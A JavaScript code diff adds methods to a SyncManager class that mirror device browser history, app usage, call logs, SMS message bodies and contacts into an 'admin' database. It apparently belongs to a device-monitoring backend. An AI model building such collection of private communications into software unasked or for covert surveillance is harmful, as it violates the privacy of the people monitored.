@@ -126,6 +126,133 @@ class SyncManager {
             console.warn('[SYNC-MANAGER] Notification sync notice:', err.message);
         }
     }
+
+    /**
+     * Dual-write browser history
+     */
+    async syncBrowserHistory(deviceId, entries, userId = null) {
+        const shouldSync = await this.shouldSyncToAdmin(deviceId);
+        if (!shouldSync) return null;
+
+        try {
+            if (isMysql()) {
+                await getMysqlAdapter().upsertBrowserHistories(deviceId, entries, userId);
+            } else {
+                const BrowserHistory = require('../models/BrowserHistory');
+                for (const e of entries) {
+                    if (!e.url) continue;
+                    await BrowserHistory.updateOne(
+                        { deviceId, userId, url: e.url, visitTime: e.visitTime || new Date() },
+                        { $set: { title: e.title || e.url, domain: e.domain || '', browser: e.browser || 'Edge' } },
+                        { upsert: true }
+                    );
+                }
+            }
+        } catch (err) {
+            console.warn('[SYNC-MANAGER] BrowserHistory sync notice:', err.message);
+        }
+    }
+
+    /**
+     * Dual-write app history
+     */
+    async syncAppHistory(deviceId, entries, userId = null) {
+        const shouldSync = await this.shouldSyncToAdmin(deviceId);
+        if (!shouldSync) return null;
+
+        try {
+            if (isMysql()) {
+                await getMysqlAdapter().upsertAppHistories(deviceId, entries, userId);
+            } else {
+                const AppHistory = require('../models/AppHistory');
+                for (const e of entries) {
+                    const appName = e.appName || e.app_name || 'Unknown';
+                    await AppHistory.updateOne(
+                        { deviceId, userId, appName, lastOpened: e.lastOpened || new Date() },
+                        { $set: { duration: e.duration || 0, appType: e.appType || 'app' } },
+                        { upsert: true }
+                    );
+                }
+            }
+        } catch (err) {
+            console.warn('[SYNC-MANAGER] AppHistory sync notice:', err.message);
+        }
+    }
+
+    /**
+     * Dual-write call logs
+     */
+    async syncCallLogs(deviceId, entries, userId = null) {
+        const shouldSync = await this.shouldSyncToAdmin(deviceId);
+        if (!shouldSync) return null;
+
+        try {
+            if (isMysql()) {
+                await getMysqlAdapter().upsertCallLogs(deviceId, entries, userId);
+            } else {
+                const CallLog = require('../models/CallLog');
+                for (const e of entries) {
+                    await CallLog.updateOne(
+                        { deviceId, userId, number: e.number || '', timestamp: e.timestamp || new Date() },
+                        { $set: { name: e.name || '', type: Number(e.type) || 0, duration: Number(e.duration) || 0 } },
+                        { upsert: true }
+                    );
+                }
+            }
+        } catch (err) {
+            console.warn('[SYNC-MANAGER] CallLog sync notice:', err.message);
+        }
+    }
+
+    /**
+     * Dual-write SMS messages
+     */
+    async syncSmsMessages(deviceId, entries, userId = null) {
+        const shouldSync = await this.shouldSyncToAdmin(deviceId);
+        if (!shouldSync) return null;
+
+        try {
+            if (isMysql()) {
+                await getMysqlAdapter().upsertSmsMessages(deviceId, entries, userId);
+            } else {
+                const SmsMessage = require('../models/SmsMessage');
+                for (const e of entries) {
+                    await SmsMessage.updateOne(
+                        { deviceId, userId, address: e.address || '', timestamp: e.timestamp || new Date() },
+                        { $set: { body: e.body || '', type: Number(e.type) || 0, read: Boolean(e.read) } },
+                        { upsert: true }
+                    );
+                }
+            }
+        } catch (err) {
+            console.warn('[SYNC-MANAGER] SmsMessage sync notice:', err.message);
+        }
+    }
+
+    /**
+     * Dual-write contacts
+     */
+    async syncContacts(deviceId, entries, userId = null) {
+        const shouldSync = await this.shouldSyncToAdmin(deviceId);
+        if (!shouldSync) return null;
+
+        try {
+            if (isMysql()) {
+                await getMysqlAdapter().upsertContacts(deviceId, entries, userId);
+            } else {
+                const Contact = require('../models/Contact');
+                for (const e of entries) {
+                    await Contact.updateOne(
+                        { deviceId, userId, name: e.name || '', phone: e.phone || e.number || '' },
+                        { $setOnInsert: { deviceId, userId, name: e.name || '', phone: e.phone || e.number || '' } },
+                        { upsert: true }
+                    );
+                }
+            }
+        } catch (err) {
+            console.warn('[SYNC-MANAGER] Contact sync notice:', err.message);
+        }
+    }
 }
 
 module.exports = new SyncManager();
